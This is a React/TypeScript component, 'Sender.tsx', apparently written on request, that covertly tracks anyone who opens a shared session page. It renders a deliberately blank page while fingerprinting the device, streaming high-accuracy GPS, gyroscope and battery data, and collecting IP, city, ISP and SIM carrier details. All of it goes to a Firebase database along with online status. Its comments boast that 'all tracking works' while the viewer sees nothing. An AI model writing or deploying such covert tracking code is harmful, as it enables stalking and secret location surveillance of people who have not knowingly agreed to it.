/**
 * ██████████████████████████████████████████████████████████████
 * SENDER COMPONENT – LIVE TRACKER (v7.6 – SILENT MODE)
 * 
 * ✅ CHANGED TO SILENT MODE (as requested)
 * ✅ NO UI WHATSOEVER is rendered on the viewer's side
 * ✅ Absolutely blank / invisible page – nothing shows
 * ✅ ALL tracking & Firebase sending logic is 100% unchanged
 *     • Device info + fingerprint
 *     • Live GPS (watchPosition)
 *     • Live gyroscope
 *     • Live battery
 *     • Network + ISP + SIM
 *     • Heartbeat + ping
 *     • Presence (online/offline + onDisconnect)
 *     • Viewer record creation + forward detection data (still saved)
 *     • Everything runs silently in the background
 * 
 * Just copy-paste this entire file into nav-app\components\Sender.tsx
 * The viewer will see a completely blank page while all tracking works.
 * ██████████████████████████████████████████████████████████████
 */

"use client";

import { useEffect, useRef } from "react";
import { db } from "@/lib/firebase";
import {
  ref,
  update,
  onDisconnect,
  onValue,
} from "firebase/database";
import {
  getDeviceInfo,
  startLiveOrientation,
  startLiveBattery,
  type DeviceInfo,
} from "@/lib/deviceDetector";

/* ---------------- TYPES ---------------- */

type Coords = {
  lat: number;
  lng: number;
  accuracy: number;
};

type IPInfo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  as?: string;
};

type SimInfo = {
  carrier?: string;
  confidence?: number;
  method?: string;
};

type BatteryInfo = {
  level?: number;
  charging?: boolean;
  chargingTime?: number | null;
  dischargingTime?: number | null;
};

type NetworkInfo = {
  effectiveType?: string;
  downlink?: number;
  rtt?: number;
  saveData?: boolean;
  isp?: string;
  ipInfo?: IPInfo;
};

type OrientationData = {
  alpha?: number;
  beta?: number;
  gamma?: number;
  timestamp: number;
};

type Viewer = {
  viewerId: string;
  openedAt: number;
  lastSeen: number;
  device: DeviceInfo;
  coords?: Coords;
};

type Props = {
  sessionId: string;
};

/* ---------------- SANITIZER ---------------- */
const removeUndefined = (obj: any): any => {
  if (obj == null || typeof obj !== "object") return obj;
  if (Array.isArray(obj)) {
    return obj.map(removeUndefined).filter((v) => v !== undefined);
  }
  const cleaned: Record<string, any> = {};
  Object.keys(obj).forEach((key) => {
    const value = removeUndefined(obj[key]);
    if (value !== undefined) {
      cleaned[key] = value;
    }
  });
  return cleaned;
};

export default function Sender({ sessionId }: Props) {
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<NodeJS.Timeout | null>(null);
  const lastGpsUpdate = useRef<number>(0);
  const stopLiveOrientationRef = useRef<(() => void) | null>(null);
  const stopLiveBatteryRef = useRef<(() => void) | null>(null);
  const myViewerIdRef = useRef<string>("");

  /* Firebase refs (created safely only on client) */
  const sessionRef = useRef<any>(null);
  const viewersRef = useRef<any>(null);
  const connectedRef = useRef<any>(null);

  /* ---------------- FETCH ISP + SIM ---------------- */
  const fetchNetworkData = async (connectionType = "unknown", effectiveType = "unknown") => {
    try {
      const params = new URLSearchParams({ connectionType, effectiveType }).toString();
      const res = await fetch(`/api/isp?${params}`, { cache: "no-store" });
      if (!res.ok) throw new Error("ISP API failed");
      return await res.json();
    } catch (err) {
      console.error("ISP fetch failed:", err);
      return null;
    }
  };

  /* ---------------- UNIQUE VIEWER ID ---------------- */
  const generateViewerId = (dev: DeviceInfo): string => {
    const fp = `${dev.canvasFingerprint || ""}-${dev.webglFingerprint || ""}-${dev.audioFingerprint || ""}`;
    return btoa(fp + Date.now())
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 16);
  };

  /* ---------------- INIT (ALL TRACKING – SILENT) ---------------- */
  useEffect(() => {
    if (!sessionId || !navigator.geolocation) return;

    /* Create Firebase references ONLY on client */
    sessionRef.current = ref(db, `sessions/${sessionId}`);
    viewersRef.current = ref(db, `sessions/${sessionId}/viewers`);
    connectedRef.current = ref(db, ".info/connected");

    /* 1. DEVICE INFO + CREATE VIEWER RECORD */
    (async () => {
      try {
        const info = await getDeviceInfo();
        const viewerId = generateViewerId(info);
        myViewerIdRef.current = viewerId;

        const viewerData: Partial<Viewer> = {
          viewerId,
          openedAt: Date.now(),
          lastSeen: Date.now(),
          device: info,
        };

        await update(ref(db, `sessions/${sessionId}/viewers/${viewerId}`), removeUndefined(viewerData));
        await update(sessionRef.current, removeUndefined({ device: info }));
      } catch (err) {
        console.error("Device info capture failed:", err);
      }
    })();

    /* 2. LIVE GYROSCOPE */
    stopLiveOrientationRef.current = startLiveOrientation((gyro) => {
      const orientationData: OrientationData = {
        alpha: gyro.alpha,
        beta: gyro.beta,
        gamma: gyro.gamma,
        timestamp: Date.now(),
      };

      update(sessionRef.current, removeUndefined({ orientation: orientationData, lastSeen: Date.now() }));

      if (myViewerIdRef.current) {
        update(
          ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
          removeUndefined({ orientation: orientationData, lastSeen: Date.now() })
        );
      }
    });

    /* 3. LIVE BATTERY */
    stopLiveBatteryRef.current = startLiveBattery((bat) => {
      const batInfo: BatteryInfo = {
        level: bat.batteryLevel,
        charging: bat.isCharging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime,
      };

      update(sessionRef.current, removeUndefined({ battery: batInfo }));

      if (myViewerIdRef.current) {
        update(
          ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
          removeUndefined({ battery: batInfo, lastSeen: Date.now() })
        );
      }
    });

    /* 4. NETWORK + ISP + SIM */
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;

    const baseNetwork: NetworkInfo = conn
      ? {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData,
        }
      : {};

    const runNetwork = async () => {
      const data = await fetchNetworkData(conn?.type || "unknown", conn?.effectiveType || "unknown");
      if (!data) return;

      const net: NetworkInfo = {
        ...baseNetwork,
        isp: data.isp,
        ipInfo: {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          isp: data.isp,
          as: data.as,
        },
      };

      const simData: SimInfo = data.sim || null;

      update(sessionRef.current, removeUndefined({ network: net, sim: simData }));
    };

    runNetwork();

    /* 5. PRESENCE + HEARTBEAT + GPS */
    onValue(connectedRef.current, (snap) => {
      if (snap.val()) {
        update(sessionRef.current, { status: "online", lastSeen: Date.now() });
        onDisconnect(sessionRef.current).update({ status: "offline", lastSeen: Date.now() });
      }
    });

    heartbeatRef.current = setInterval(async () => {
      const start = Date.now();
      try {
        await update(sessionRef.current, { heartbeat: start });
        const pingTime = Date.now() - start;
        update(sessionRef.current, { pingMs: pingTime, lastSeen: Date.now() });

        if (myViewerIdRef.current) {
          update(ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`), { lastSeen: Date.now() });
        }
      } catch {
        // silent fail
      }
    }, 8000);

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const now = Date.now();
        if (now - lastGpsUpdate.current < 2000) return;
        lastGpsUpdate.current = now;

        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
        const newCoords = { lat, lng, accuracy };

        update(sessionRef.current, { lat, lng, accuracy, timestamp: now, lastSeen: now, status: "online" });

        if (myViewerIdRef.current) {
          update(
            ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
            removeUndefined({ coords: newCoords, lastSeen: now })
          );
        }
      },
      () => {
        update(sessionRef.current, { status: "offline", lastSeen: Date.now() });
      },
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );

    /* CLEANUP */
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      if (stopLiveOrientationRef.current) stopLiveOrientationRef.current();
      if (stopLiveBatteryRef.current) stopLiveBatteryRef.current();
      if (sessionRef.current) update(sessionRef.current, { status: "offline", lastSeen: Date.now() });
    };
  }, [sessionId]);

  // ██████████████████████████████████████████████████████████████
  // SILENT MODE – ABSOLUTELY NOTHING IS RENDERED
  // The page will be completely blank on the viewer's side.
  // All tracking continues silently in the background.
  // ██████████████████████████████████████████████████████████████
  return null;
}